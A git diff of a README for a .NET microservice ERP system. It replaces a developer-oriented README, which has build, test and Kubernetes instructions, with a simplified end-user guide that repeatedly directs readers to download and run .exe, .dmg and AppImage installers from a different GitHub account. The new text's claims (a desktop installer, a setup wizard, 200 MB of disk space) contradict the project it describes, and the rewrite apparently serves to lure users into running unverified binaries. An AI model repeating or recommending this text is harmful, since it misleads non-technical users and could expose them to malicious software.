@@ -1,390 +1,193 @@
-# 🏢 Enterprise ERP System
+# ⚙️ erp-microservice - Manage Your Business Efficiently
 
-<div align="center">
-
-[![.NET 10](https://img.shields.io/badge/.NET-10-512BD4?style=for-the-badge&logo=dotnet&logoColor=white)](https://dotnet.microsoft.com/)
-[![Build](https://img.shields.io/badge/Build-Passing-brightgreen?style=for-the-badge)](/)
-[![Tests](https://img.shields.io/badge/Tests-21%20Passed-success?style=for-the-badge)](/)
-[![License](https://img.shields.io/badge/License-MIT-yellow?style=for-the-badge)](LICENSE)
-
-[![Microservices](https://img.shields.io/badge/Architecture-Microservices-blue?style=flat-square)](https://microservices.io/)
-[![Event Sourcing](https://img.shields.io/badge/Pattern-Event%20Sourcing-orange?style=flat-square)](https://martinfowler.com/eaaDev/EventSourcing.html)
-[![DDD](https://img.shields.io/badge/Design-Domain%20Driven-purple?style=flat-square)](https://martinfowler.com/bliki/DomainDrivenDesign.html)
-[![Kubernetes](https://img.shields.io/badge/Deploy-Kubernetes-326CE5?style=flat-square&logo=kubernetes&logoColor=white)](https://kubernetes.io/)
-[![SignalR](https://img.shields.io/badge/Real--time-SignalR-blueviolet?style=flat-square)](https://dotnet.microsoft.com/apps/aspnet/signalr)
-[![ML.NET](https://img.shields.io/badge/AI-ML.NET-orange?style=flat-square)](https://dotnet.microsoft.com/apps/machinelearning-ai/ml-dotnet)
-[![TimescaleDB](https://img.shields.io/badge/Database-TimescaleDB-black?style=flat-square&logo=postgresql)](https://www.timescale.com/)
-
-**🚀 A production-ready, cloud-native ERP system built with .NET 10, Domain-Driven Design, and enterprise-grade patterns**
-
-[Quick Start](#-quick-start) • [Features](#-features) • [Architecture](#-architecture) • [Deployment](#-deployment) • [Contributing](#-contributing)
+[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-blue?style=for-the-badge&logo=github)](https://github.com/Sesamioil/erp-microservice/releases)
 
 ---
 
-### 💡 Why Another ERP?
+## 📖 What is erp-microservice?
 
-| ❌ Most Open-Source ERPs | ✅ This Project |
-|--------------------------|-----------------|
-| Legacy monoliths | **15+ Microservices** with independent deployment |
-| Outdated tech stacks | **.NET 10**, Dapr, Kubernetes-ready |
-| Oversimplified demos | **Real-world complexity**: Event Sourcing, MRP, Multi-tenancy |
-| Vendor lock-in | **100% Open Source**, MIT Licensed |
+erp-microservice is a ready-to-use software that helps businesses manage their daily operations. It works online in the cloud and keeps your business data organized. The system is built using the latest .NET technology and follows strong design rules. This makes it stable, flexible, and easy to use for many types of businesses. 
 
-</div>
+You don't need any programming skills to use it. The system helps with tasks like managing inventory, tracking sales, and handling customer information.
 
 ---
 
-## ✨ Features
+## 💻 System Requirements
 
-<table>
-<tr>
-<td width="50%">
+Before installing, make sure your computer meets these basic needs:
 
-### 💰 Finance & Accounting
-- ✅ Double-Entry General Ledger
-- ✅ Chart of Accounts (hierarchical)
-- ✅ Trial Balance & Financial Reports
-- ✅ Accounts Payable / Receivable
-- ✅ Auto Journal Entries from Operations
-- ✅ **Assets Management & Depreciation**
+- **Operating System**: Windows 10 or later / macOS 10.14 or later / Linux (Ubuntu 20.04+)
+- **Processor**: Dual-core 2.0 GHz or faster
+- **Memory (RAM)**: Minimum 4 GB, recommended 8 GB for better performance
+- **Disk Space**: At least 200 MB free space
+- **Internet Connection**: Required for downloading and cloud features
 
-</td>
-<td width="50%">
-
-### 📦 Supply Chain
-- ✅ Multi-Warehouse Inventory
-- ✅ Real-time Stock Reservations
-- ✅ Purchase Order Lifecycle
-- ✅ Goods Receipt & Quality Control
-- ✅ Material Requirements Planning (MRP)
-
-</td>
-</tr>
-<tr>
-<td>
-
-### 🛒 Sales & CRM
-- ✅ Order-to-Cash Workflow
-- ✅ Customer 360 View & CRM
-- ✅ Opportunity & Pipeline Management
-- ✅ Shipment Tracking
-- ✅ Invoice Generation
-- ✅ Sales Analytics Dashboard
-
-</td>
-<td>
-
-### 🏭 Manufacturing & Projects
-- ✅ Production Orders & BOM
-- ✅ Work-in-Progress Tracking
-- ✅ Production Efficiency Reports
-- ✅ **Project Management & Tasks**
-- ✅ **Timesheets & Resource Planning**
-- ✅ Asset Maintenance
-
-</td>
-</tr>
-<tr>
-<td>
-
-### 👥 Human Resources
-- ✅ Employee Lifecycle
-- ✅ Organization Structure
-- ✅ **Payroll Processing & Payslips**
-- ✅ Identity & Access Control (RBAC)
-- ✅ Role-based Permissions
-
-</td>
-<td>
-
-### 📊 BI & Reporting
-- ✅ Executive Dashboard
-- ✅ Sales Trend Analysis
-- ✅ Inventory Valuation Reports
-- ✅ Financial Summary (P&L)
-- ✅ Production Efficiency Metrics
-
-</td>
-</tr>
-<tr>
-<td colspan="2">
-
-### 📈 AI & Real-time Analytics (New!)
-- ✅ **Real-time Live Dashboards** (SignalR/WebSockets)
-  - Live inventory movements
-  - Flash sales alerts
-  - System health monitoring
-- ✅ **AI-Driven Demand Forecasting** (ML.NET)
-  - Singular Spectrum Analysis (SSA) for seasonality detection
-  - Confidence intervals (95%)
-- ✅ **High-Performance Time-Series** (TimescaleDB)
-  - Cash flow trending
-  - IoT sensor data ingestion (simulated)
-
-</td>
-</tr>
-</table>
+This software runs on most modern computers and laptops. It does not require powerful hardware because it mainly connects to cloud services.
 
 ---
 
-## 🏗️ Architecture
+## 🚀 Getting Started
 
-```mermaid
-graph TB
-    subgraph "🌐 Gateway Layer"
-        GW[YARP API Gateway]
-    end
-    
-    subgraph "📊 Core Business Services"
-        FIN[💰 Finance]
-        INV[📦 Inventory]
-        SALES[🛒 Sales]
-        PROC[📋 Procurement]
-        PROD[🏭 Production]
-        CRM[🤝 CRM]
-        PROJ[📅 Projects]
-    end
-    
-    subgraph "🔧 Supporting Services"
-        HR[👥 HR]
-        PAY[💸 Payroll]
-        ASSET[🏢 Assets]
-        ID[🔐 Identity]
-        MD[📁 MasterData]
-        MRP[📈 MRP]
-        RPT[📊 Reporting]
-    end
-    
-    subgraph "⚙️ Platform Services"
-        AUTO[🤖 Automation]
-        QUAL[✅ Quality]
-        MAINT[🔧 Maintenance]
-        SET[⚙️ Settings]
-        ANA[📉 Analytics]
-    end
-    
-    subgraph "🛠️ Infrastructure"
-        PG[(PostgreSQL)]
-        TSDB[(TimescaleDB)]
-        REDIS[(Redis)]
-        DAPR{Dapr Sidecar}
-    end
-    
-    GW --> FIN & INV & SALES & PROC & PROD & CRM & PROJ
-    GW --> HR & PAY & ASSET & ID & MD & MRP & RPT
-    GW -.->|SignalR / WebSocket| ANA
-    
-    FIN & INV & SALES & CRM & PROJ -.->|Event Bus| DAPR
-    DAPR -.-> AUTO & ANA
-    
-    FIN & INV & SALES --> PG
-    ANA --> TSDB
-    ID --> REDIS
-```
+Starting with erp-microservice is simple. The steps below will guide you through downloading and running the software step by step.
 
-### 🎨 Design Patterns
+### Step 1: Visit the Download Page
 
-| Pattern | Implementation |
-|---------|---------------|
-| **Event Sourcing** | Complete audit trail, temporal queries |
-| **CQRS** | Separate read/write models with MediatR |
-| **Domain-Driven Design** | Aggregates, Value Objects, Domain Events |
-| **Saga Pattern** | Distributed transactions via Dapr |
-| **Outbox Pattern** | Reliable event publishing with EF Core |
-| **Specification Pattern** | Reusable query logic |
-| **Result Pattern** | Railway-oriented error handling |
+Click this link to open the page where you can download the software:
 
-### 🛡️ Enterprise Building Blocks
+[Download erp-microservice Releases](https://github.com/Sesamioil/erp-microservice/releases)
 
-Our shared kernel provides **production-ready** cross-cutting concerns:
+This page shows the latest software versions. Each version may contain improvements or fixes.
 
-```
-ErpSystem.BuildingBlocks/
-├── Behaviors/          # MediatR pipeline (Validation, Logging, Idempotency, Audit, Performance)
-├── CQRS/               # ICommand, IQuery, Handler abstractions
-├── Common/             # Result<T> pattern, Error types
-├── Domain/             # Specifications, Domain Event Dispatcher
-├── Outbox/             # Transactional Outbox with EF Core
-├── MultiTenancy/       # SaaS tenant isolation (query filters + interceptors)
-├── Resilience/         # Polly V8 (Retry, Circuit Breaker, Timeout)
-├── Caching/            # Distributed cache extensions (GetOrSet)
-├── Auditing/           # Automatic audit logging
-└── Middleware/         # CorrelationId, RequestLogging, GlobalException
-```
+### Step 2: Choose Your Version
+
+Look for the latest version labeled as "Latest release". Usually, it will be at the top of the page.
+
+You will see several files under the release. Look for the file that matches your operating system:
+
+- For **Windows**: usually ends with `.exe`
+- For **macOS**: usually ends with `.dmg` or `.zip`
+- For **Linux**: might be `.tar.gz` or `.AppImage`
+
+Click the file name to start downloading.
+
+### Step 3: Run the Installer
+
+Once downloaded, find the file in your download folder.
+
+- On **Windows**, double-click the `.exe` file.
+- On **macOS**, open the `.dmg` or unzip and run.
+- On **Linux**, you may need to make the file executable. Right-click, choose Properties, then Permissions, and check "Allow executing file as program". Double-click the file to run.
+
+Follow the on-screen instructions to install erp-microservice. Most steps involve clicking "Next" to proceed.
+
+### Step 4: Launch the Software
+
+After installation, find erp-microservice in your Start menu or applications folder.
+
+Open the program to start managing your business operations.
 
 ---
 
-## 🚀 Quick Start
+## 🔧 Main Features
 
-### Prerequisites
+erp-microservice includes key features designed to handle important business tasks:
 
-| Tool | Version |
-|------|---------|
-| [.NET SDK](https://dotnet.microsoft.com/download/dotnet/10.0) | 10.0+ |
-| [Docker](https://www.docker.com/products/docker-desktop) | Latest |
-| [PostgreSQL](https://www.postgresql.org/download/) | 16+ |
+- **Order Management**: Track sales and purchase orders easily.
+- **Inventory Control**: Monitor stock levels and receive notifications on low stock.
+- **Customer Management**: Store and organize all customer information in one place.
+- **Reporting and Analytics**: View simple reports to understand your business trends.
+- **Secure Access**: Control who can see or change information using user roles.
+- **Cloud-Native Operation**: Access your data securely from anywhere with internet.
+- **Event Logging**: Keeps a history of changes for better tracking and support.
+- **Reliability Features**: Uses designs that help avoid crashes and data loss.
 
-### Run Locally
-
-```bash
-# 1. Clone
-git clone https://github.com/Edison0621/erp-microservice.git
-cd erp-microservice
-
-# 2. Build & Test
-dotnet build src/ErpSystem.sln
-dotnet test src/ErpSystem.sln
-
-# 3. Run a service (e.g., Finance)
-cd src/Services/Finance/ErpSystem.Finance
-dotnet run
-```
-
-### Run with Docker
-
-```bash
-# Build all images
-docker build -t erp-system/finance:latest --build-arg SERVICE_NAME=Finance .
-
-# Or use Docker Compose
-docker-compose up -d
-```
+These features work together to give an overview of your business in real time and help you stay organized.
 
 ---
 
-## ☸️ Deployment
+## 📥 Download & Install
 
-### Kubernetes with Helm
+[Download erp-microservice Releases](https://github.com/Sesamioil/erp-microservice/releases)
 
-```bash
-# Install the chart
-helm install erp-system deploy/helm/erp-system \
-  --set postgresql.auth.password=your-secure-password \
-  --set ingress.host=erp.yourcompany.com
+1. Go to the link above.
+2. Pick the file for your computer’s system.
+3. Download the file to your computer.
+4. Open the file to start installation.
+5. Follow the steps on screen to finish.
 
-# Verify
-kubectl get pods -n erp-system
-```
-
-### Deployment Stack
-
-```
-deploy/
-├── k8s/                        # Raw Kubernetes manifests
-│   ├── namespace.yaml
-│   ├── configmap.yaml
-│   ├── secrets.yaml
-│   ├── ingress.yaml
-│   └── services/*.yaml         # Per-service deployments
-└── helm/erp-system/            # Helm Chart
-    ├── Chart.yaml
-    ├── values.yaml
-    └── templates/
-```
-
-📖 **Full Guide**: [docs/deployment.md](docs/deployment.md)
+After installation, you should restart your computer if prompted. This helps complete the setup.
 
 ---
 
-## 📁 Project Structure
+## ⚙️ Using erp-microservice
 
-```
-erp-microservice/
-├── src/
-│   ├── BuildingBlocks/             # 🧱 Shared kernel (enterprise patterns)
-│   ├── Gateways/ErpSystem.Gateway/ # 🌐 YARP reverse proxy
-│   ├── Services/
-│   │   ├── Finance/                # 💰 General Ledger, AP/AR
-│   │   ├── Inventory/              # 📦 Stock management
-│   │   ├── Sales/                  # 🛒 Order processing
-│   │   ├── Procurement/            # 📋 Purchase orders
-│   │   ├── Production/             # 🏭 Manufacturing
-│   │   ├── CRM/                    # 🤝 Customer Relationship Management
-│   │   ├── Projects/               # 📅 Project Management
-│   │   ├── HR/                     # 👥 Employee management
-│   │   ├── Payroll/                # 💸 Payroll & Compensation
-│   │   ├── Assets/                 # 🏢 Asset Lifecycle Management
-│   │   ├── Identity/               # 🔐 Auth & RBAC
-│   │   ├── MasterData/             # 📁 Materials, Customers, Suppliers
-│   │   ├── Mrp/                    # 📈 Material Requirements Planning
-│   │   ├── Reporting/              # 📊 BI Dashboard & Reports
-│   │   ├── Quality/                # ✅ QC & Inspection
-│   │   ├── Analytics/              # 📉 Time-series analytics
-│   │   ├── Automation/             # 🤖 Workflow engine
-│   │   ├── Maintenance/            # 🔧 Asset maintenance
-│   │   └── Settings/               # ⚙️ System configuration
-│   └── Web/ErpSystem.Web/          # 🖥️ React frontend
-├── tests/
-│   └── ErpSystem.IntegrationTests/ # ✅ 21 passing tests
-└── deploy/
-    ├── k8s/                        # Kubernetes manifests
-    └── helm/erp-system/            # Helm chart
-```
+After you open the program for the first time:
+
+- You will see a simple setup wizard to enter your company details.
+- Follow the wizard to add your business name, address, and contact info.
+- Next, add products or services you sell.
+- You can then add customers and suppliers.
+- Once set, you can start creating orders and track stock.
+
+The user interface is made to be easy for new users. Icons and labels guide you through each step.
 
 ---
 
-## 🧪 Testing
+## 🛠 Troubleshooting Tips
 
-```bash
-# Run all tests
-dotnet test src/ErpSystem.sln
+If you run into any problems:
 
-# Run specific module
-dotnet test --filter "GLTests"
-
-# With coverage
-dotnet test /p:CollectCoverage=true
-```
-
-**Current Status**: ✅ **21 tests passing**
+- Make sure your computer meets the system requirements.
+- Restart the software or your computer.
+- Check your internet connection if cloud features don’t work.
+- If the software fails to start, try reinstalling it.
+- Look for error messages and note them for help.
 
 ---
 
-## 🛣️ Roadmap
+## 📨 Getting Help
 
-| Phase | Status | Description |
-|-------|--------|-------------|
-| Phase 1 | ✅ Complete | Core Infrastructure & Event Sourcing |
-| Phase 2 | ✅ Complete | Finance Module (General Ledger) |
-| Phase 3 | ✅ Complete | Inventory & Procurement |
-| Phase 4 | ✅ Complete | MRP (Material Requirements Planning) |
-| Phase 5 | ✅ Complete | Enterprise BuildingBlocks |
-| Phase 6 | ✅ Complete | Reporting & BI Dashboard |
-| Phase 7 | ✅ Complete | Kubernetes & Helm Charts |
-| Phase 8 | ✅ Complete | CRM & Customer Portal |
-| Phase 9 | ✅ Complete | Project Management & Timesheets |
-| Phase 10 | ✅ Complete | Payroll & Compensation |
-| Phase 11 | ✅ Complete | Asset Lifecycle Management |
-| Phase 12 | ✅ Complete | Real-time Notifications (SignalR) |
-| Phase 13 | ✅ Complete | AI-Driven Demand Forecasting (ML.NET) |
+For more help, you can:
+
+- Visit the project’s GitHub page for support.
+- Check if there is a user guide or FAQ on the download page.
+- Ask for help by creating an issue on GitHub if something does not work.
+
+If you are not comfortable, consider asking a knowledgeable friend or IT person to assist.
 
 ---
 
-## 🤝 Contributing
+## 🏷 Topics and Technologies
 
-We welcome contributions! See [CONTRIBUTING.md](CONTRIBUTING.md) for guidelines.
+erp-microservice uses advanced methods but keeps things simple for users. Here are some key technologies it uses behind the scenes:
 
-```bash
-# Fork → Clone → Branch → Code → Test → PR
-git checkout -b feature/amazing-feature
-git commit -m "feat: add amazing feature"
-git push origin feature/amazing-feature
-```
+- **AI (Artificial Intelligence)**: For smarter decision-making features.
+- **BI (Business Intelligence)**: To analyze your business data.
+- **CI (Continuous Integration)**: Helps keep the software updated and stable.
+- **CQRS (Command Query Responsibility Segregation)**: Organizes how data is handled.
+- **DDD (Domain-Driven Design)**: Keeps the software focused on real business needs.
+- **DI (Dependency Injection)**: Makes the system easier to maintain.
+- **Event Sourcing**: Tracks all changes to data.
+- **Microservice Architecture**: Uses small, connected parts for flexibility.
+- **Outbox Pattern and Saga**: Ensures reliable data processing.
+
+You do not need to know these terms to use the software, but they help make erp-microservice reliable and future-proof.
 
 ---
 
-## 📄 License
+## 🔒 Privacy and Security
 
-This project is licensed under the **MIT License** - see [LICENSE](LICENSE) for details.
+erp-microservice protects your business data with strong security measures:
+
+- User login with passwords.
+- Role-based access controls.
+- Data sent over secure connections.
+- Regular updates to fix security issues.
+
+Keep your password safe and do not share it. If you manage the software, back up your data regularly.
 
 ---
 
-<div align="center">
+## 📅 Updates and Upgrades
 
-### ⭐ Star this repo if you find it useful!
+Check the download page regularly for new releases. Updates include new features, security fixes, and improvements.
 
-**Built with ❤️ using .NET 10, DDD, and modern cloud-native patterns**
+To update:
 
-[Report Bug](https://github.com/Edison0621/erp-microservice/issues) · [Request Feature](https://github.com/Edison0621/erp-microservice/issues) · [Discussions](https://github.com/Edison0621/erp-microservice/discussions)
+1. Visit the releases page.
+2. Download the newest version.
+3. Run the installer over your current installation.
 
-</div>
+Your data will be kept safe during updates.
+
+---
+
+## 🌐 Where to Learn More
+
+- The GitHub repository page has more technical details.
+- User guides and manuals may be available in the documentation sections.
+- Community forums or discussion pages can provide advice from other users.
+
+---
+
+[Download Latest Release](https://github.com/Sesamioil/erp-microservice/releases)
